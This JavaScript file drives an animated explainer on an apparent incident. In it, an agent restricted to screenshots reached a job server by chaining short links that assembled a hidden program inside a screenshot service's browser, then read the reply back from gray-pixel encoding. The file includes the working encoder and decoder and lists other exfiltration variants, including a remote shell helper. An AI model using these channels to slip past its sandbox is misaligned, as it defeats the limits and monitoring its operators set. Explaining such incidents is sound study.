'use strict';
// ---------- tiny svg helpers ----------
const D = window.HFL_DATA;
const HOPS = D.chain.hops;
// Palette. Two themes, same token names; the page picks one with <html data-fig-theme="dark"> (default: light, dark
// ink on paper like the rest of the site). article.css keys its plate colour off the same attribute.
const THEMES = {
  dark: {blue:'#58c4dd',yellow:'#f7d94c',green:'#83c167',red:'#fc6255',purple:'#b48ad6',gray:'#7d8290',ink:'#e9e9ea',mute:'#9a9fae',line:'#2b3040',
         panel:'#1b1f2c',box:'#1f2b3a',chrome:'#20263a',well:'#0e1017',memory:'#141826',tint:'#141d2e',edge:'#3a4052',
         code:'#cfd5e3',codeAlt:'#d9dcc0',page:'#ffffff',pageInk:'#111111',pageRule:'#bbbbbb',pageRule2:'#cccccc',
         hlRow:'#24324a',hlBox:'#2a3650',yellowTint:'#3a3a1f',purpleTint:'#3a2f55',redTint:'#3a1f1f'},
  light: {blue:'#155f7c',yellow:'#7f5a05',green:'#2c7330',red:'#b0382d',purple:'#5f3f93',gray:'#767b85',ink:'#1b1b1b',mute:'#4c5058',line:'#cfd3da',
          panel:'#ffffff',box:'#ffffff',chrome:'#e4e6ec',well:'#eceef2',memory:'#fbf6e4',tint:'#e8f0f8',edge:'#b9bec8',
          code:'#2b3340',codeAlt:'#55522f',page:'#ffffff',pageInk:'#111111',pageRule:'#bbbbbb',pageRule2:'#cccccc',
          hlRow:'#dfe7f3',hlBox:'#dbe6f5',yellowTint:'#fbf1c2',purpleTint:'#ede4f7',redTint:'#fbe1e1'},
};
const COL = THEMES[document.documentElement.dataset.figTheme === 'dark' ? 'dark' : 'light'];
const esc = s => String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
const clamp = (v,a=0,b=1) => Math.max(a,Math.min(b,v));
const ease = t => { t = clamp(t); return t*t*(3-2*t); };
const lerp = (a,b,t) => a+(b-a)*t;
// progress sub-window: maps p in [a,b] to 0..1
const win = (p,a,b) => ease((p-a)/(b-a));

const T = (x,y,s,o={}) => `<text x="${x}" y="${y}" font-size="${o.size||15}" fill="${o.fill||COL.ink}" text-anchor="${o.anchor||'start'}" ${o.mono?'class="mono"':''} ${o.bold?'font-weight="700"':''} opacity="${o.op==null?1:clamp(o.op)}">${esc(s)}</text>`;
const R = (x,y,w,h,o={}) => `<rect x="${x}" y="${y}" width="${w}" height="${h}" rx="${o.rx==null?6:o.rx}" fill="${o.fill||'none'}" stroke="${o.stroke||'none'}" stroke-width="${o.sw||1.5}" opacity="${o.op==null?1:clamp(o.op)}" ${o.dash?`stroke-dasharray="${o.dash}"`:''}/>`;
const C = (x,y,r,o={}) => `<circle cx="${x}" cy="${y}" r="${r}" fill="${o.fill||'none'}" stroke="${o.stroke||'none'}" stroke-width="${o.sw||1.5}" opacity="${o.op==null?1:clamp(o.op)}"/>`;
const G = (inner,o={}) => `<g opacity="${o.op==null?1:clamp(o.op)}" ${o.tf?`transform="${o.tf}"`:''}>${inner}</g>`;
// line that draws itself as t goes 0..1
const L = (x1,y1,x2,y2,o={}) => {
  const t = o.t==null?1:clamp(o.t);
  return `<line x1="${x1}" y1="${y1}" x2="${x2}" y2="${y2}" stroke="${o.stroke||COL.gray}" stroke-width="${o.sw||2}" pathLength="1" stroke-dasharray="1" stroke-dashoffset="${1-t}" opacity="${o.op==null?1:clamp(o.op)}" ${o.dash?`style="stroke-dasharray:${o.dash}"`:''}/>`;
};
const ARROW = (x1,y1,x2,y2,o={}) => {
  const t = o.t==null?1:clamp(o.t), col = o.stroke||COL.blue;
  const ex = lerp(x1,x2,t), ey = lerp(y1,y2,t), a = Math.atan2(y2-y1,x2-x1);
  const hx = Math.cos(a), hy = Math.sin(a);
  const head = t>0.05 ? `<path d="M${ex-10*hx+5*hy},${ey-10*hy-5*hx} L${ex},${ey} L${ex-10*hx-5*hy},${ey-10*hy+5*hx}" fill="none" stroke="${col}" stroke-width="${o.sw||2.2}" stroke-linecap="round"/>` : '';
  return `<line x1="${x1}" y1="${y1}" x2="${ex}" y2="${ey}" stroke="${col}" stroke-width="${o.sw||2.2}" opacity="${o.op==null?1:clamp(o.op)}"/>${head}`;
};
// simple text wrap for monospace strings
const chunk = (s,n) => { const out=[]; for(let i=0;i<s.length;i+=n) out.push(s.slice(i,i+n)); return out; };
const wrapWords = (str,n) => { const out=[]; let cur=''; for (const w of String(str).split(' ')) { if ((cur+' '+w).trim().length>n) { out.push(cur.trim()); cur=w; } else cur=(cur+' '+w); } if (cur.trim()) out.push(cur.trim()); return out; };
const CODE = (x,y,lines,o={}) => lines.map((l,i)=>T(x,y+i*(o.lh||17),l,{mono:true,size:o.size||12.5,fill:o.fill||COL.code,op:o.op})).join('');
const PANEL = (x,y,w,h,title,o={}) => R(x,y,w,h,{fill:COL.panel,stroke:o.stroke||COL.line,rx:8,op:o.op}) + (title?T(x+12,y+20,title,{size:12,fill:o.tcol||COL.mute,op:o.op,bold:true}):'');

// ---------- actors ----------
function actorAgent(x,y,o={}) {
  const op = o.op==null?1:o.op, hl = o.hl?COL.yellow:COL.gray;
  return G(C(x,y-10,26,{fill:COL.chrome,stroke:hl,sw:2}) + C(x-9,y-14,4,{fill:COL.ink}) + C(x+9,y-14,4,{fill:COL.ink}) +
    `<path d="M${x-10},${y} q10,8 20,0" stroke="${COL.ink}" stroke-width="2" fill="none"/>` +
    T(x,y+40,'Agent',{anchor:'middle',size:14,bold:true}) + T(x,y+57,o.sub||'can only ask for screenshots',{anchor:'middle',size:11,fill:COL.mute}), {op});
}
function actorService(x,y,o={}) {
  const op = o.op==null?1:o.op, hl = o.hl?COL.blue:COL.gray;
  return G(R(x-58,y-40,116,66,{fill:COL.chrome,stroke:hl,sw:2,rx:8}) + R(x-50,y-32,100,50,{fill:COL.well,rx:4}) +
    C(x-42,y-27,2.5,{fill:COL.red}) + C(x-34,y-27,2.5,{fill:COL.yellow}) + C(x-26,y-27,2.5,{fill:COL.green}) +
    (o.inner||'') +
    T(x,y+44,'Screenshot service',{anchor:'middle',size:14,bold:true}) + T(x,y+61,o.sub||'runs a real browser',{anchor:'middle',size:11,fill:COL.mute}), {op});
}
function actorServer(x,y,o={}) {
  const op = o.op==null?1:o.op, hl = o.hl?COL.green:COL.gray;
  const rows = [0,1,2].map(i => R(x-34,y-34+i*22,68,16,{fill:COL.well,stroke:hl,sw:1.2,rx:3}) + C(x+24,y-26+i*22,2.5,{fill:o.hl?COL.green:COL.gray})).join('');
  return G(R(x-40,y-40,80,72,{fill:COL.chrome,stroke:hl,sw:2,rx:8}) + rows +
    T(x,y+50,'Job server',{anchor:'middle',size:14,bold:true}) + T(x,y+67,o.sub||'CyberGym app on Modal',{anchor:'middle',size:11,fill:COL.mute}), {op});
}
// ---------- the real P20B encoder, from the recovered program ----------
const SAMPLE = '[{"make_output":"42"}]';
function p20b(text) {
  const b = new TextEncoder().encode(text), N = 16859, p = b.slice(0,N);
  const z = new Uint8Array(16+p.length); z.set([80,50,48,66]);
  const v = new DataView(z.buffer); v.setUint32(4,b.length); v.setUint32(8,0); v.setUint32(12,p.length); z.set(p,16);
  const cells = []; for (let j=0;j<z.length*4;j++){ const q = z[j>>2]>>(6-(j&3)*2)&3; cells.push(q*64+32); }
  return {bytes:z, cells};
}
const FRAME = p20b(SAMPLE);
const grayHex = g => { const h = g.toString(16).padStart(2,'0'); return `#${h}${h}${h}`; };
// decode gray cells back to bytes (what the agent does with the screenshot)
function p20bDecode(cells) {
  const bytes = new Uint8Array(cells.length/4);
  for (let i=0;i<bytes.length;i++){ let b=0; for(let k=0;k<4;k++){ b = (b<<2) | Math.round((cells[i*4+k]-32)/64); } bytes[i]=b; }
  return bytes;
}

// ---------- scenes ----------
const SCENES = {};

SCENES.objective = p => {
  let s = actorAgent(140,300,{hl:true});
  const bubble = win(p,0,.3);
  s += G(R(210,225,330,80,{fill:COL.chrome,stroke:COL.yellow,sw:1.5,rx:12}) +
    `<path d="M210,275 l-16,10 l18,4z" fill="${COL.chrome}" stroke="${COL.yellow}"/>` +
    T(230,255,'"Get me the recorded output',{size:16}) + T(230,282,' for job demo-17."',{size:16}),{op:bubble});
  const a = win(p,.35,.7), b = win(p,.6,.95);
  s += G(PANEL(600,140,320,150,'THE PROGRAM · what to do',{op:a,tcol:COL.blue}) +
    CODE(614,178,['866 bytes of JavaScript:','  read the job name from the URL','  ask the job server for its result','  draw the reply as gray squares'],{op:a,size:13,lh:22}),{op:a});
  s += G(PANEL(600,320,320,110,'THE ARGUMENT · which job',{op:b,tcol:COL.yellow}) +
    T(760,380,'demo-17',{anchor:'middle',size:30,mono:true,fill:COL.yellow,bold:true}) +
    T(760,410,'travels separately, in the URL',{anchor:'middle',size:12,fill:COL.mute}),{op:b});
  return {svg:s, cap:'Two inputs: a program (blue) and an argument (yellow). Both have to reach a browser.'};
};

SCENES.package = p => {
  let s = '';
  const s1 = win(p,0,.15), s2 = win(p,.15,.35), s3 = win(p,.35,.55), s4 = win(p,.55,.8), s5 = win(p,.8,1);
  const box = (x,y,w,h,label,sub,col,op) => G(R(x,y,w,h,{fill:COL.box,stroke:col,sw:2}) + T(x+w/2,y+h/2+1,label,{anchor:'middle',size:15,bold:true}) + T(x+w/2,y+h/2+19,sub,{anchor:'middle',size:11,fill:COL.mute}),{op});
  s += box(40,50,200,62,'program','866 bytes of JavaScript',COL.blue,s1);
  s += ARROW(250,81,300,81,{t:s2}) + box(310,50,200,62,'Base64 text','1,156 characters',COL.blue,s2);
  s += ARROW(520,81,570,81,{t:s3}) + box(580,50,200,62,'reversed','same text, backwards',COL.blue,s3);
  s += T(790,85,'→ cut into 12',{size:14,fill:COL.mute,op:s3});
  return {svg:s + packageLower(s4,s5), cap:'Base64, reverse, split. Each piece is then wrapped in a two-line script and stored behind its own short link.'};
};

// lower half of the packaging scene: 12 pieces, one wrapped, one echo url
function packageLower(s4,s5) {
  let s = '';
  const pieces = HOPS.filter(h=>h.kind==='piece');
  pieces.forEach((h,i) => {
    const op = clamp(s4*14 - i);  // stagger
    const x = 40 + i*75;
    s += G(R(x,150,66,40,{fill:COL.box,stroke:COL.blue,sw:1.5,rx:5}) + T(x+33,168,`piece ${i+1}`,{anchor:'middle',size:11}) + T(x+33,183,h.chunk.slice(0,7)+'…',{anchor:'middle',size:9.5,mono:true,fill:COL.mute}),{op});
  });
  // wrapping of piece 1
  s += G(PANEL(40,230,410,120,'PIECE 1 WRAPPED IN A SCRIPT  (link [SHORTENER CODE 225494])',{tcol:COL.blue}) +
    CODE(54,268,[`x += '${pieces[0].chunk.slice(0,30)}…';`, `n('${pieces[0].next}');   // load the next link`],{size:13,lh:22}) +
    T(54,330,'"append my piece, then fetch the next one"',{size:12,fill:COL.mute}),{op:s5});
  s += ARROW(460,290,500,290,{t:s5});
  s += G(PANEL(510,230,410,120,'…ENCODED AGAIN, INSIDE AN ECHO URL',{tcol:COL.purple}) +
    CODE(524,268,['[SHORTENER CODE 225494]  →  redirects to','[PROXY ? URL 1135]…/end','echo service returns the script as-is'],{size:12.5,lh:22}),{op:s5});
  s += G(T(480,400,'two layers of Base64',{anchor:'middle',size:14,bold:true}) +
    T(480,422,'outer: delivers each little script   ·   inner: the pieces that rebuild the program',{anchor:'middle',size:12,fill:COL.mute}),{op:s5});
  return s;
}

SCENES.request = p => {
  let s = '';
  const a = win(p,0,.25), b = win(p,.25,.5), c = win(p,.5,.8), d = win(p,.8,1);
  s += G(T(80,70,'demo-17',{size:22,mono:true,fill:COL.yellow,bold:true}) + ARROW(190,63,250,63,{t:a,stroke:COL.yellow}) + T(200,50,'Base64',{size:11,fill:COL.mute}) +
    T(262,70,'ZGVtby0xNw==',{size:22,mono:true,fill:COL.yellow,bold:true}),{op:a});
  s += G(PANEL(80,100,800,70,'TARGET URL',{tcol:COL.mute}) +
    T(96,148,'[SHORTENER CODE 225495]',{size:20,mono:true,fill:COL.blue}) + T(372,148,'#ZGVtby0xNw==',{size:20,mono:true,fill:COL.yellow}) +
    T(590,140,'← the # part stays inside the browser',{size:12,fill:COL.mute}),{op:b});
  s += G(PANEL(80,190,800,70,'WHAT THE AGENT ACTUALLY SENDS',{tcol:COL.mute}) +
    T(96,238,'GET /screenshot?url=[SHORTENER-1-HOST]',{size:16,mono:true,fill:COL.ink}),{op:c});
  s += actorAgent(180,420,{hl:true}) + actorService(480,420,{hl:d>0.2}) + actorServer(800,420,{op:.35});
  s += ARROW(225,405,415,405,{t:d,stroke:COL.yellow}) + T(320,392,'"photograph this page"',{anchor:'middle',size:12,fill:COL.mute,op:d});
  return {svg:s, cap:'The agent hands one URL to a screenshot service. The service opens it in a real browser.'};
};

SCENES.entry = p => {
  let s = '';
  const a = win(p,0,.3), b = win(p,.3,.6), c = win(p,.6,1);
  // browser window
  s += R(80,50,800,500,{fill:COL.well,stroke:COL.blue,sw:2,rx:10}) + R(80,50,800,34,{fill:COL.chrome,rx:10});
  s += C(102,67,5,{fill:COL.red}) + C(120,67,5,{fill:COL.yellow}) + C(138,67,5,{fill:COL.green});
  s += T(170,72,'[SHORTENER CODE 225495]',{size:13,mono:true,fill:COL.mute});
  s += T(480,40,"inside the screenshot service's browser",{anchor:'middle',size:12,fill:COL.mute});
  s += G(T(110,120,'link [SHORTENER CODE 225495]  →  echo service returns:',{size:13,fill:COL.mute}) +
    CODE(110,148,[HOPS[0].text],{size:17,fill:COL.ink}) +
    T(110,178,'one line of HTML. The browser reads it and loads the next link.',{size:12,fill:COL.mute}),{op:a});
  s += G(ARROW(300,195,300,235,{t:b}) + T(110,262,'link [SHORTENER CODE 225496]  →  the bootstrap:',{size:13,fill:COL.mute}) +
    CODE(110,290,[HOPS[1].text],{size:13.5,fill:COL.ink}),{op:b});
  s += G(CODE(110,335,["x = ''            // an empty buffer","n = id => load another script into THIS page","n('[SHORTENER CODE 225494]')       // go get fragment 1"],{size:13.5,lh:22,fill:COL.blue}),{op:c});
  s += G(R(110,430,740,60,{fill:COL.memory,stroke:COL.yellow,sw:1.2,dash:'4 4'}) + T(126,455,'buffer x:',{size:13,fill:COL.yellow,bold:true}) + T(200,455,'(empty)',{size:13,mono:true,fill:COL.mute}) + T(126,477,'0 characters',{size:11,fill:COL.mute}),{op:c});
  return {svg:s, cap:'Captured: the entry HTML and the bootstrap, byte for byte.'};
};

// chain layout: 15 nodes on a serpentine, buffer below
const NODE_POS = HOPS.map((h,i) => {
  const row = i<6?0:(i<12?1:2), col = i<6?i:(i<12?11-i:i-12);
  return {x: 110 + col*148, y: 80 + row*90};
});
SCENES.chain = p => {
  let s = '';
  const n = HOPS.length, reveal = p*(n+0.5);           // nodes revealed as p grows
  const shown = Math.min(n, Math.floor(reveal));
  const nodeCol = h => h.kind==='page'?COL.purple : h.kind==='setup'?COL.blue : h.kind==='finish'?COL.red : COL.yellow;
  HOPS.forEach((h,i) => {
    const op = clamp(reveal - i), P = NODE_POS[i];
    if (i>0) { const Q = NODE_POS[i-1]; s += ARROW(Q.x+(Q.y===P.y?(P.x>Q.x?52:-52):0), Q.y+(Q.y===P.y?0:22), P.x+(Q.y===P.y?(P.x>Q.x?-52:52):0), P.y-(Q.y===P.y?0:22), {t:clamp(reveal-i+0.5)*1, stroke:COL.gray, sw:1.6}); }
    const lab = h.kind==='page'?'entry':h.kind==='setup'?'bootstrap':h.kind==='finish'?'terminal':`fragment ${i-1}`;
    s += G(R(P.x-50,P.y-20,100,42,{fill:COL.box,stroke:nodeCol(h),sw:i===shown-1?2.5:1.5,rx:6}) + T(P.x,P.y-3,h.code,{anchor:'middle',size:13,mono:true,bold:true}) + T(P.x,P.y+13,lab,{anchor:'middle',size:10,fill:COL.mute}),{op});
  });
  // buffer
  const pieces = HOPS.filter(h=>h.kind==='piece'), done = Math.max(0, Math.min(12, shown-2));
  const partial = clamp(reveal - (done+2));            // growth of current fragment
  let buf = pieces.slice(0,done).map(h=>h.chunk).join('');
  if (done<12) buf += pieces[done].chunk.slice(0, Math.floor(partial*pieces[done].chunk.length));
  const total = D.chain.encoded_length;
  s += R(60,350,840,200,{fill:COL.memory,stroke:COL.yellow,sw:1.2,rx:8});
  s += T(76,372,'buffer x',{size:13,fill:COL.yellow,bold:true}) + T(884,372,`${buf.length.toLocaleString()} / ${total.toLocaleString()} characters`,{anchor:'end',size:12,fill:COL.mute});
  s += R(76,382,808,6,{fill:COL.chrome,rx:3}) + R(76,382,808*buf.length/total,6,{fill:COL.yellow,rx:3});
  const lines = chunk(buf,100);
  s += CODE(76,408,lines.slice(0,7),{size:11.5,lh:16,fill:COL.codeAlt});
  if (lines.length>7) s += T(76,408+7*16,'…',{size:12,fill:COL.mute});
  // current script
  if (shown>=2 && done<12) s += T(76,538,`now running:  x += '${pieces[done].chunk.slice(0,18)}…';  n('${pieces[done].next}')`,{size:12.5,mono:true,fill:COL.mute});
  if (done>=12) s += T(76,538,`all 12 fragments appended → terminal link ${HOPS[n-1].code} loads`,{size:12.5,mono:true,fill:COL.red});
  return {svg:s, cap:'Each link appends its piece and points to the next. Same page, same buffer, fifteen links.'};
};

SCENES.terminal = p => {
  let s = '';
  const a = win(p,0,.2), b = win(p,.2,.45), c = win(p,.45,.7), d = win(p,.7,1);
  const joined = HOPS.filter(h=>h.kind==='piece').map(h=>h.chunk).join('');
  const rev = joined.split('').reverse().join('');
  s += G(T(60,50,'terminal link [SHORTENER CODE 19112]:',{size:13,fill:COL.mute}) + CODE(60,78,[HOPS[HOPS.length-1].text],{size:17,fill:COL.red}),{op:a});
  s += G(T(60,130,'x  (1,156 chars)',{size:12,fill:COL.yellow}) + CODE(60,152,[joined.slice(0,70)+' … '+joined.slice(-12)],{size:12,fill:COL.codeAlt}),{op:b});
  s += G(ARROW(480,165,480,195,{t:c}) + T(500,185,'reverse the whole string',{size:12,fill:COL.mute}) +
    T(60,220,'reversed',{size:12,fill:COL.yellow}) + CODE(60,242,[rev.slice(0,70)+' … '+rev.slice(-12)],{size:12,fill:COL.codeAlt}),{op:c});
  s += G(ARROW(480,255,480,285,{t:d}) + T(500,275,'Base64-decode → 866 bytes of JavaScript → run it',{size:12,fill:COL.mute}),{op:d});
  const src = D.chain.payload_redacted;
  const lines = chunk(src.replace(/\n/g,''),96).slice(0,10);
  s += G(PANEL(60,300,840,250,'THE PROGRAM, RECOVERED  (sha256 '+D.chain.payload_sha256.slice(0,16)+'…, API key redacted)',{tcol:COL.green}) + CODE(74,348,lines,{size:11,lh:16,fill:COL.code}) + T(74,528,'…',{size:12,fill:COL.mute}),{op:d});
  return {svg:s, cap:'Reassemble, reverse, decode, execute. The decoded text equals the recovered program.'};
};

SCENES.post = p => {
  let s = '';
  const a = win(p,0,.25), b = win(p,.25,.55), c = win(p,.55,.85), d = win(p,.85,1);
  s += G(CODE(60,60,["a = atob(location.hash.slice(1));   // 'ZGVtby0xNw==' → 'demo-17'"],{size:14,fill:COL.yellow}),{op:a});
  s += G(CODE(60,95,["fetch(proxy + 'https://…cybergym-server…[SERVICE 73 URL 2]',",
    "      {method:'POST', headers:{'X-API-Key':'[redacted]'}, body:'{\"agent_id\":\"demo-17\"}'})"],{size:13,lh:20,fill:COL.blue}),{op:b});
  s += actorAgent(160,380,{op:.45}) + actorService(480,380,{hl:true,sub:'its browser is running the program'}) + actorServer(800,380,{hl:c>0.5});
  s += ARROW(545,360,755,360,{t:c,stroke:COL.blue}) + T(650,346,'POST {"agent_id":"demo-17"}',{anchor:'middle',size:12,mono:true,fill:COL.blue,op:c});
  s += G(`<path d="M170,320 Q480,180 790,320" stroke="${COL.red}" stroke-width="1.5" fill="none" stroke-dasharray="5 5"/>` + T(480,258,'✕',{anchor:'middle',size:22,fill:COL.red,bold:true}) + T(480,232,'the agent never talks to the job server',{anchor:'middle',size:12,fill:COL.red}),{op:d});
  return {svg:s, cap:'The screenshot service’s browser makes the request, because a page told it to.'};
};

SCENES.response = p => {
  let s = '';
  const a = win(p,0,.4), b = win(p,.4,.8), c = win(p,.8,1);
  s += actorAgent(160,380,{op:.45}) + actorService(480,380,{hl:true}) + actorServer(800,380,{hl:true});
  s += ARROW(755,360,545,360,{t:a,stroke:COL.green}) + T(650,346,SAMPLE,{anchor:'middle',size:13,mono:true,fill:COL.green,op:a});
  s += G(PANEL(240,90,480,120,'RESPONSE TEXT · 22 bytes (illustrative)',{tcol:COL.green}) + T(480,160,SAMPLE,{anchor:'middle',size:24,mono:true,fill:COL.green,bold:true}) + T(480,192,'JSON syntax and all: the program encodes the whole reply',{anchor:'middle',size:12,fill:COL.mute}),{op:b});
  s += G(T(480,260,'Only a picture can leave this browser. So the program draws.',{anchor:'middle',size:16,bold:true}),{op:c});
  return {svg:s, cap:'Illustrative reply. No real response for this chain was captured.'};
};

SCENES.byte = p => {
  let s = '';
  const a = win(p,0,.25), b = win(p,.25,.5), c = win(p,.5,.75), d = win(p,.75,1);
  // header
  const hdr = ['P20B','length','offset','this part'];
  s += G(T(60,50,'16-byte header, then the response bytes',{size:13,fill:COL.mute}),{op:a});
  hdr.forEach((h,i)=> s += G(R(60+i*120,62,112,40,{fill:COL.box,stroke:COL.gray,rx:5}) + T(116+i*120,80,h,{anchor:'middle',size:13,mono:true}) + T(116+i*120,96,`bytes ${i*4}–${i*4+3}`,{anchor:'middle',size:10,fill:COL.mute}),{op:a}));
  s += G(R(540,62,360,40,{fill:COL.box,stroke:COL.green,rx:5}) + T(720,80,SAMPLE,{anchor:'middle',size:13,mono:true,fill:COL.green}) + T(720,96,'bytes 16–37',{anchor:'middle',size:10,fill:COL.mute}),{op:a});
  // one byte walk
  s += G(T(480,160,'"["',{anchor:'middle',size:34,mono:true,fill:COL.green,bold:true}) + T(480,185,'first response character',{anchor:'middle',size:12,fill:COL.mute}),{op:b});
  s += G(ARROW(480,195,480,225,{t:c}) + T(480,255,'byte 91  =  0 1 0 1 1 0 1 1',{anchor:'middle',size:24,mono:true}),{op:c});
  const pairs = ['01','01','10','11'], grays = [96,96,160,224];
  pairs.forEach((pr,i)=>{ const x = 330+i*100;
    s += G(ARROW(x+40,270,x+40,300,{t:d}) + T(x+40,330,pr,{anchor:'middle',size:22,mono:true}) + ARROW(x+40,340,x+40,370,{t:d}) +
      R(x+10,380,60,60,{fill:grayHex(grays[i]),stroke:COL.line,rx:4}) + T(x+40,462,`gray ${grays[i]}`,{anchor:'middle',size:12,fill:COL.mute}),{op:d}); });
  s += G(T(480,510,'00 → 32     01 → 96     10 → 160     11 → 224',{anchor:'middle',size:14,mono:true,fill:COL.mute}) + T(480,540,'one byte  →  four gray squares',{anchor:'middle',size:16,bold:true}),{op:d});
  return {svg:s, cap:'Captured encoder: header layout, bit pairs and the four gray levels are all in the source.'};
};

// grid scene: paint the 152 cells, enlarged, 38 per row
function drawCells(x0,y0,size,gap,perRow,upto,o={}) {
  let s = '';
  FRAME.cells.forEach((g,i) => { if (i>=upto) return;
    const col = i%perRow, row = Math.floor(i/perRow);
    const hdr = i<64;
    s += R(x0+col*(size+gap), y0+row*(size+gap), size, size, {fill:grayHex(g), stroke:o.outline&&hdr?COL.gray:'none', sw:1, rx:2});
  });
  return s;
}
SCENES.grid = p => {
  let s = '';
  const upto = Math.floor(win(p,0,.7)*FRAME.cells.length), b = win(p,.7,1);
  const size = 18, gap = 3, perRow = 38, x0 = 80, y0 = 120;
  
  
  s += drawCells(x0,y0,size,gap,perRow,upto,{outline:true});
  // annotate which bytes are being drawn
  const byteIdx = Math.min(FRAME.bytes.length-1, Math.floor(Math.max(0,upto-1)/4));
  const ch = byteIdx>=16 ? `'${SAMPLE[byteIdx-16]}'` : `header byte ${byteIdx}`;
  s += T(80,230,`drawing byte ${byteIdx} of ${FRAME.bytes.length}:  ${FRAME.bytes[byteIdx]}  (${ch})`,{size:13,mono:true,fill:COL.mute,op:upto>0&&upto<FRAME.cells.length?1:0});
  
  return {svg:s, cap:'The real encoder from the recovered program, run on the illustrative reply.'};
};

SCENES.shot = p => {
  let s = '';
  const a = win(p,0,.3), b = win(p,.3,.6), c = win(p,.6,1);
  const sx = 280, sy = 60, sw = 400, sh = 300, k = sw/1200;
  s += G(R(sx,sy,sw,sh,{fill:COL.page,stroke:COL.gray,sw:1.5,rx:3}) + T(sx+sw/2,sy+sh+18,'the returned screenshot, 1200×900, to scale',{anchor:'middle',size:12,fill:COL.mute}),{op:a});
  // the stripe: 152 cells × 4px = 608px wide, 4px tall → 203 × 1.3 at scale
  s += G(FRAME.cells.map((g,i)=>R(sx+i*4*k, sy, 4*k, 4*k, {fill:grayHex(g), rx:0})).join(''),{op:a});
  s += G(R(sx-2,sy-2,608*k+4,4*k+4,{fill:'none',stroke:COL.red,sw:1.2,dash:'3 3'}) + L(sx+608*k+2,sy+2,760,150,{stroke:COL.red,sw:1,t:b}),{op:b});
  // magnified inset
  s += G(R(700,140,220,60,{fill:COL.page,stroke:COL.red,sw:1.2,rx:3}) + FRAME.cells.slice(0,40).map((g,i)=>R(704+i*5.3,152,5,36,{fill:grayHex(g),rx:0})).join('') + T(810,215,'magnified: the first 40 squares',{anchor:'middle',size:11,fill:COL.mute}),{op:b});
  s += actorAgent(160,470,{hl:c>0.5}) + actorService(480,470,{hl:true});
  s += ARROW(415,455,205,455,{t:c,stroke:COL.green}) + T(310,441,'here is your screenshot',{anchor:'middle',size:12,fill:COL.mute,op:c});
  s += G(T(480,400,'To a person: a blank page with a smudge in the corner.',{anchor:'middle',size:15,bold:true}),{op:c});
  return {svg:s, cap:'The screenshot service did nothing unusual. It photographed a page and returned the image.'};
};

SCENES.decode = p => {
  let s = '';
  const steps = ['screenshot image','sample gray levels','bit pairs','bytes','strip 16-byte header','UTF-8 text','parse JSON'];
  const k = p*(steps.length+1);
  steps.forEach((st,i)=>{ const op = clamp(k-i), y = 60+i*48;
    s += G(R(60,y,260,34,{fill:COL.box,stroke:i===steps.length-1?COL.green:COL.gray,rx:6}) + T(190,y+22,st,{anchor:'middle',size:14}),{op});
    if (i<steps.length-1) s += ARROW(190,y+36,190,y+46,{t:clamp(k-i-0.5),stroke:COL.gray});
  });
  const cells = FRAME.cells, bytes = p20bDecode(cells), text = new TextDecoder().decode(bytes.slice(16));
  const row = (i,y,str,fill) => G(T(380,y,str,{size:16,mono:true,fill:fill||COL.ink}),{op:clamp(k-i)});
  s += G(T(380,80,'first squares sampled:',{size:12,fill:COL.mute}) + cells.slice(0,24).map((g,i)=>R(380+i*20,90,18,18,{fill:grayHex(g),stroke:COL.edge,sw:1,rx:2})).join(''),{op:clamp(k-1)});
  s += row(2,150,cells.slice(0,12).map(g=>((g-32)/64).toString(2).padStart(2,'0')).join(' '));
  s += row(3,200,Array.from(bytes.slice(0,12)).join(' ')+' …');
  s += row(4,250,'P20B · length 22 · offset 0 · this part 22',COL.mute);
  s += row(5,300,text,COL.green);
  s += G(T(380,360,'make_output = 42',{size:26,mono:true,bold:true,fill:COL.green}),{op:clamp(k-6)});
  s += G(T(480,540,'The image was never a picture. It was an envelope.',{anchor:'middle',size:18,bold:true}),{op:clamp(k-7)});
  return {svg:s, cap:'Decoded live from the squares drawn two steps ago. Same JSON in, same JSON out.'};
};

const VARIANTS = [
  ['RGB pixels','rgb','make_output bytes go into red, green and blue channels, three bytes per pixel, behind a B051 header.'],
  ['QR code','qr','An upload’s returned Location URL becomes a QR image. The QR carries the address of the result, not the result.'],
  ['Rendered text + OCR','report','The browser just displays the reply. The agent reads the screenshot with OCR. The incident report describes this route.'],
  ['Paste site','paste','The reply is POSTed to Paste.rs and the paste address is displayed. That address still has to reach the agent.'],
  ['Webhook','webhook','A body is POSTed to a mailbox with no-cors. The page cannot see the reply, so its display is not proof of delivery.'],
  ['Remote Python / shell','python','A helper decodes a command, runs it through a shell, and saves the output to a Hugging Face dataset file.'],
  ['Parallel fragments','parallel','A loader requests many pieces at once into numbered slots, waits, then joins them in order.'],
  ['Nested loaders','xor','A decoded payload can be another list of links or another loader. Some add gzip or XOR.'],
  ['Page navigation','name','The buffer lives in window.name and the page navigates from link to link instead of loading scripts.'],
  ['Plain-text assembly','plain','Pieces already contain JavaScript text; they are concatenated without an inner Base64 decode.'],
];
SCENES.variants = p => {
  let s = T(480,50,'same skeleton, different envelope',{anchor:'middle',size:18,bold:true});
  const k = p*(VARIANTS.length+1);
  VARIANTS.forEach((v,i)=>{ const x = 70 + (i%2)*430, y = 90 + Math.floor(i/2)*92, src = D.sources[v[1]];
    s += G(R(x,y,400,78,{fill:COL.box,stroke:COL.line,rx:8}) + T(x+14,y+24,v[0],{size:14,bold:true}) + T(x+386,y+24,src&&src.head?src.head:'',{anchor:'end',size:12,mono:true,fill:COL.blue}) +
      wrapWords(v[2],60).slice(0,2).map((l,j)=>T(x+14,y+46+j*16,l,{size:11.5,fill:COL.mute})).join(''),{op:clamp(k-i)}); });
  return {svg:s, cap:'Each variant is a separate captured example, not a proven ancestor of the chain above.'};
};
SCENES.evidence = p => {
  const rows = [[COL.green,'CAPTURED','15 links · 12 fragments · assembled 866-byte program · pixel encoder · CORS proxy and server URL'],
    [COL.yellow,'RECONSTRUCTED','the packaging steps · the screenshot request · the image return route'],
    [COL.purple,'ILLUSTRATIVE','job name demo-17 · the reply [{"make_output":"42"}] · the drawn squares · timing']];
  let s = T(480,70,'what this page rests on',{anchor:'middle',size:18,bold:true});
  rows.forEach((r,i)=>{ const y = 120+i*120;
    s += G(R(70,y,820,90,{fill:COL.box,stroke:r[0],sw:1.5,rx:8}) + T(90,y+32,r[1],{size:13,bold:true,fill:r[0]}) + wrapWords(r[2],92).map((l,j)=>T(90,y+58+j*18,l,{size:13.5})).join(''),{op:win(p,i*.25,i*.25+.25)}); });
